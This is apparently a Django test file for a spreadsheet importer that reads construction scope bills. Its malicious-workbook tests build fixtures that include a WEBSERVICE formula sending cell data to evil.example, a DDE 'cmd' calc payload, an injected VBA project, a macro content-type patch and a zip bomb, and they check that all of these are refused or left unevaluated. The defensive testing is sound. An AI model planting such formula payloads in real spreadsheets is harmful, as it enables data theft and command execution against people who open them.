"""
Reading scope workbooks and CSVs, matching lines by ref then description, and refusing what
can't be read safely: macro-enabled files, VBA projects, zip bombs, sheets claiming to be huge,
formulas (never run: only Excel's saved value is read).
"""
import io
import time
import zipfile
from decimal import Decimal as D

import openpyxl
from django.core.files.uploadedfile import SimpleUploadedFile
from django.test import SimpleTestCase

from levelling import importer
from levelling.importer import Row, WorkbookRefused


def xlsx(rows, name='scope.xlsx', setup=None):
    wb = openpyxl.Workbook()
    ws = wb.active
    for r in rows:
        ws.append(r)
    if setup:
        setup(ws)
    buf = io.BytesIO()
    wb.save(buf)
    return SimpleUploadedFile(name, buf.getvalue())


def csv_file(text, name='scope.csv', enc='utf-8'):
    return SimpleUploadedFile(name, text.encode(enc))


HEAD = ['Ref', 'Description', 'Qty', 'Unit', 'Rate', 'Total']


class ParseTests(SimpleTestCase):
    def test_header_row_found_below_a_title(self):
        f = xlsx([['Kingsway joinery bill'], [], ['Item', 'Description', 'Quantity', 'Unit'],
                  ['J1', 'Reception desk', None, 'Item'], ['J2', 'Base units', 8, 'm']])
        rows, skipped = importer.read(f)
        self.assertEqual([(r.ref, r.description, r.qty, r.unit) for r in rows],
                         [('J1', 'Reception desk', None, 'Item'), ('J2', 'Base units', D('8'), 'm')])
        self.assertEqual(skipped, 0)

    def test_without_a_header_columns_a_to_f_are_read_in_order(self):
        rows, _ = importer.read(csv_file('J1,Desk,1,nr,1450.50,\nJ2,Units,8,m,,4160\n'))
        self.assertEqual([(r.ref, r.qty, r.rate, r.total) for r in rows],
                         [('J1', D('1'), D('1450.50'), None), ('J2', D('8'), None, D('4160'))])

    def test_headings_and_total_rows_are_skipped(self):
        rows, skipped = importer.read(xlsx([HEAD, [None, 'TEA POINT'], ['J2', 'Base units', 8, 'm', 520, 4160],
                                            [None, 'Total carried to summary', None, None, None, 4160],
                                            [None, 'Sub-total', None, None, None, 4160]]))
        self.assertEqual([r.ref for r in rows], ['J2'])
        self.assertEqual(skipped, 3)

    def test_money_text_included_and_floats(self):
        rows, _ = importer.read(xlsx([HEAD, ['A', 'One', 2, 'm', '£1,250.00', None], ['B', 'Two', 1, 'nr', 'Incl', None],
                                      ['C', 'Three', 3, 'm', 12.1, None], ['D', 'Four', 1, 'nr', 'n/a', None],
                                      ['E', 'Five', 1, 'nr', '(100)', None]]))
        got = {r.ref: (r.rate, r.included) for r in rows}
        self.assertEqual(got['A'], (D('1250.00'), False))
        self.assertEqual(got['B'], (None, True))
        self.assertEqual(got['C'], (D('12.1'), False))  # float 12.1 read through its repr, never kept as float
        self.assertIsInstance(got['C'][0], D)
        self.assertEqual(got['D'], (None, False))
        self.assertEqual(got['E'], (D('-100'), False))

    def test_absurd_numbers_are_ignored(self):
        self.assertIsNone(importer.parse_number('1e400'))
        self.assertIsNone(importer.parse_number(D('NaN')))
        self.assertIsNone(importer.parse_number(D('1000000000000')))
        self.assertEqual(importer.parse_number(' 1 250.5 '), D('1250.5'))

    def test_csv_in_windows_encoding(self):
        rows, _ = importer.read(csv_file('Ref,Description,Qty,Unit\nJ1,Desk – oak,1,nr\n', enc='cp1252'))
        self.assertEqual(rows[0].description, 'Desk – oak')

    def test_nothing_usable(self):
        with self.assertRaises(WorkbookRefused):
            importer.read(xlsx([HEAD]))


class MatchTests(SimpleTestCase):
    EXISTING = [(1, 'J1', 'Reception desk'), (2, 'J2', 'Tea point base units'), (3, '', 'Window boards, MDF'),
                (4, 'X', 'Duplicate'), (5, 'X', 'Other duplicate')]

    def test_ref_then_description(self):
        incoming = [Row(ref='j 1', description='Changed wording'), Row(ref='', description='window boards  mdf'),
                    Row(ref='J9', description='Tea Point Base Units'), Row(ref='Z', description='Not ours')]
        self.assertEqual(importer.match_lines(self.EXISTING, incoming), {0: 1, 1: 3, 2: 2})

    def test_duplicate_refs_fall_back_to_description(self):
        incoming = [Row(ref='X', description='Other duplicate')]
        self.assertEqual(importer.match_lines(self.EXISTING, incoming), {0: 5})

    def test_each_line_matched_once(self):
        incoming = [Row(ref='J1', description='Reception desk'), Row(ref='', description='Reception desk')]
        self.assertEqual(importer.match_lines(self.EXISTING, incoming), {0: 1})


class MaliciousWorkbookTests(SimpleTestCase):
    def test_macro_enabled_names_refused(self):
        for name in ('bill.xlsm', 'bill.XLSM', 'bill.xltm', 'bill.xls', 'bill.xlsb', 'bill.xlam'):
            with self.subTest(name=name), self.assertRaises(WorkbookRefused):
                importer.read(SimpleUploadedFile(name, b'PK\x03\x04'))
        with self.assertRaisesMessage(WorkbookRefused, 'Upload an Excel workbook'):
            importer.read(SimpleUploadedFile('bill.pdf', b'%PDF'))

    def _repack(self, f, extra=None, types_patch=None):
        src = zipfile.ZipFile(io.BytesIO(f.read()))
        out = io.BytesIO()
        with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as z:
            for info in src.infolist():
                data = src.read(info)
                if types_patch and info.filename == '[Content_Types].xml':
                    data = types_patch(data)
                z.writestr(info, data)
            for name, data in (extra or {}).items():
                z.writestr(name, data)
        return SimpleUploadedFile('innocent.xlsx', out.getvalue())

    def test_vba_project_inside_an_xlsx_is_refused(self):
        f = self._repack(xlsx([HEAD, ['J1', 'Desk', 1, 'nr']]), extra={'xl/vbaProject.bin': b'\x00' * 64})
        with self.assertRaisesMessage(WorkbookRefused, 'macros'):
            importer.read(f)

    def test_macro_enabled_content_type_is_refused(self):
        patch = lambda d: d.replace(b'spreadsheetml.sheet.main+xml',  # noqa: E731
                                    b'sheet.macroEnabled.main+xml')
        f = self._repack(xlsx([HEAD, ['J1', 'Desk', 1, 'nr']]), types_patch=patch)
        with self.assertRaisesMessage(WorkbookRefused, 'macro-enabled'):
            importer.read(f)

    def test_zip_bomb_refused_before_opening(self):
        f = self._repack(xlsx([HEAD, ['J1', 'Desk', 1, 'nr']]), extra={'xl/media/huge.bin': b'\x00' * (26 * 1024 * 1024)})
        self.assertLess(f.size, 1024 * 1024)
        with self.assertRaisesMessage(WorkbookRefused, 'too large once unpacked'):
            importer.read(f)

    def test_not_a_workbook(self):
        with self.assertRaisesMessage(WorkbookRefused, 'readable Excel workbook'):
            importer.read(SimpleUploadedFile('fake.xlsx', b'just text'))

    def test_oversized_file(self):
        with self.assertRaisesMessage(WorkbookRefused, 'over 5 MB'):
            importer.read(SimpleUploadedFile('big.csv', b'a' * (importer.MAX_BYTES + 1)))

    def test_formulas_are_never_run_or_imported(self):
        def setup(ws):
            ws['E2'] = '=WEBSERVICE("http://evil.example/"&B2)'   # a formula: no saved value
            ws['E3'] = '=1+1'
            ws['B4'] = '=cmd|\' /C calc\'!A0'                  # a formula in the description
            ws['B5'].value = '=HYPERLINK("http://evil.example")'
            ws['B5'].data_type = 's'                             # text that merely looks like a formula
        f = xlsx([HEAD, ['J1', 'Desk', 1, 'nr'], ['J2', 'Units', 8, 'm'], ['J3', None, 1, 'nr'], ['J4', None, 1, 'nr']],
                 setup=setup)
        rows, _ = importer.read(f)
        got = {r.ref: r for r in rows}
        self.assertIsNone(got['J1'].rate)         # never evaluated, never the formula text
        self.assertIsNone(got['J2'].rate)
        self.assertEqual(got['J3'].description, 'J3')  # formula description gives nothing; falls back to the ref
        self.assertEqual(got['J4'].description, '=HYPERLINK("http://evil.example")')  # kept as text, exported safely
        from levelling.exports import safe
        self.assertEqual(safe(got['J4'].description)[0], "'")

    def test_sheet_claiming_huge_dimensions_reads_quickly(self):
        def setup(ws):
            ws.cell(row=1048576, column=16384, value='far away')   # XFD1048576
        f = xlsx([HEAD, ['J1', 'Desk', 1, 'nr'], ['J2', 'Units', 8, 'm']], setup=setup)
        start = time.monotonic()
        rows, _ = importer.read(f)
        self.assertLess(time.monotonic() - start, 5)
        self.assertEqual([r.ref for r in rows], ['J1', 'J2'])

    def test_too_many_rows_refused(self):
        lines = [HEAD] + [[f'L{i}', f'Line {i}', 1, 'nr'] for i in range(importer.MAX_ROWS + 5)]
        with self.assertRaisesMessage(WorkbookRefused, 'more than 2,000 rows'):
            importer.read(xlsx(lines))
        with self.assertRaisesMessage(WorkbookRefused, 'more than 2,000 rows'):
            importer.read(csv_file('\n'.join(','.join(map(str, r)) for r in lines)))

    def test_wide_sheets_are_cut_at_column_z(self):
        f = xlsx([HEAD + ['x'] * 100, ['J1', 'Desk', 1, 'nr'] + ['y'] * 100])
        raw = importer.raw_rows(f)
        self.assertEqual(len(raw[0]), importer.MAX_COLS)
